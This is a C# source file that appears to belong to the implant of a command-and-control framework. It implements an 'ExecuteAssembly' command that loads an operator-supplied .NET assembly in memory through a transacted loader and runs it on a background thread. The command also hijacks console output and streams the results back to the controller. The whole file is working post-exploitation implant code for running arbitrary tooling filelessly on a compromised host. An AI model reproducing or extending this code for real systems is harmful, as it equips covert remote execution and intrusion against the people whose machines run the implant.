using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class ExecuteAssembly : DroneCommand
{
    public override byte Command => 0x3F;
    public override bool Threaded => true;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        using var ms = new MemoryStream();
        using var sw = new StreamWriter(ms) { AutoFlush = true };
        
        // hijack console output
        var stdOut = Console.Out;
        var stdErr = Console.Error;
        
        Console.SetOut(sw);
        Console.SetError(sw);

        Thread t = null;
        t = new Thread(RunAssembly);
        t.Start();

        async void RunAssembly()
        {
            // load and run assembly
            using var transactAsm = new TransactedAssembly();
            var asm = transactAsm.Load(task.Artefact);

            if (asm is null)
            {
                await Drone.SendTaskError(task.Id, "Failed to load assembly");
                t?.Abort();
                return;
            }

            // this will block
            asm.EntryPoint?.Invoke(null, new object[] { task.Arguments });
        }

        // whilst assembly is executing
        // keep looping and reading stream

        byte[] output;
        
        do
        {
            // check cancellation token
            if (cancellationToken.IsCancellationRequested)
            {
                t.Abort();
                break;
            }

            output = ReadStream(ms);

            if (output.Length > 0)
                await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.RUNNING, output));

            Thread.Sleep(100);
            
        } while (t.IsAlive);
        
        // after task has finished, do a final read
        output = ReadStream(ms);
        
        if (output.Length > 0)
            await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, output));
        
        // restore console
        Console.SetOut(stdOut);
        Console.SetError(stdErr);
    }

    private static byte[] ReadStream(MemoryStream ms)
    {
        var output = ms.ToArray();

        if (output.Length > 0)
            ms.Clear();

        return output;
    }
}